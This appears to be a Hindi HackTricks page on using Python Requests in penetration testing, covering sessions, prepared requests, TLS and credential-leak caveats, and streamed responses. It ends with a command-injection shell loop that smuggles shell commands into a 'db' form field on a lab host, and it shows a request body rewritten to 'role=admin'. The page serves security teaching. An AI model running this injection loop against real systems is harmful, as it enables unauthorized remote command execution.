# वेब Requests

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

इन उदाहरणों में Requests के documented request arguments, response properties, multipart file tuples और sessions का उपयोग किया गया है।<sup>[[1]](#references)</sup> `verify=False` वाले उदाहरण TLS certificate verification को disable करते हैं और इन्हें केवल controlled testing तक सीमित रखना चाहिए।<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## payload control के लिए Prepared requests

एक `PreparedRequest` भेजे जाने से पहले final URL, headers और encoded body दिखाता है। जब session cookies या authentication लागू करना आवश्यक हो, तो इसे `Request.prepare()` के बजाय `Session.prepare_request()` से बनाएं; जब prepared-flow को environment proxy/CA settings का भी पालन करना हो, तो उन्हें `merge_environment_settings()` के साथ स्पष्ट रूप से merge करें।<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
यह तब उपयोगी होता है जब किसी exploit के लिए non-standard encoding की आवश्यकता हो या `response.request` में stored request के साथ constructed payload की तुलना करनी हो। यह raw-HTTP primitive नहीं है: Requests headers को case-insensitive mapping में store करता है, इसलिए duplicate name assign करने पर पिछली value replace हो जाती है। malformed request lines या [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md) के लिए आवश्यक distinct duplicate `Content-Length`/`Transfer-Encoding` fields भेजने हेतु lower-level sender का उपयोग करें।<sup>[[1]](#references)</sup>

## Session isolation, implicit credentials और TLS state

Session default रूप से environment configuration पर trust करता है। यदि कोई explicit authentication supplied नहीं है, तो Requests `.netrc` से Basic credentials प्राप्त कर सकता है; यह environment variables से proxy configuration और CA bundle paths भी import कर सकता है। attacker-controlled URLs fetch करने वाली scripts के लिए, उन implicit inputs को disable करें और केवल intended lab proxy/CA को explicitly configure करें। 2.32.4 से पहले के releases maliciously crafted URL दिए जाने पर गलत host के लिए `.netrc` credentials select कर सकते थे, जबकि upgrade संभव न होने पर `Session.trust_env = False` documented workaround है।<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
ऐसे session, जो `verify=False` का उपयोग करते हैं, उन्हें उन sessions से अलग रखें जिनमें verified TLS आवश्यक है। Requests 2.32.0 से पहले, `verify=False` के साथ पहली बार खोला गया connection बाद के same-origin requests के लिए फिर से उपयोग किया जा सकता था, भले ही उन requests में `verify=True` निर्दिष्ट हो; upgrade करने से यह pool-state समस्या ठीक हो जाती है, लेकिन isolation से exploit scripts का audit करना भी आसान हो जाता है।<sup>[[5]](#references)</sup>

## विश्वसनीय exploit loops

Requests में कोई default timeout नहीं होता। `(connect, read)` timeout कुल wall-clock deadline नहीं है: read component यह सीमित करता है कि client प्राप्त bytes के बीच कितनी देर प्रतीक्षा करेगा। जब target `Location` को नियंत्रित करता हो, तो automatic redirects disable करें और नया request भेजने से पहले प्रत्येक hop को validate करें; यदि redirects enabled हों, तो `response.history` inspect करें। बड़े या hostile responses के लिए `stream=True` का उपयोग करें, सीमित आकार के chunks में iterate करें, और context manager के साथ response को close करें ताकि pooled connection release हो जाए।<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## RCE exploit करने के लिए Python cmd

कमांड लूप Python के `Cmd` को subclass करता है; इसका `default` method अपरिचित command prefixes को संभालता है, `cmdloop` input lines को dispatch करता है, और `re.DOTALL` extraction pattern को newlines तक विस्तारित होने देता है।<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Requests Developer Interface](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — line-oriented command interpreters के लिए support](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Regular expression operations](https://docs.python.org/3/library/re.html)
- [4] [Requests में malicious URLs के माध्यम से `.netrc` credentials leak के प्रति vulnerability](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [पहली request को `verify=False` के साथ करने के बाद Requests `Session` object requests को verify नहीं करता](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
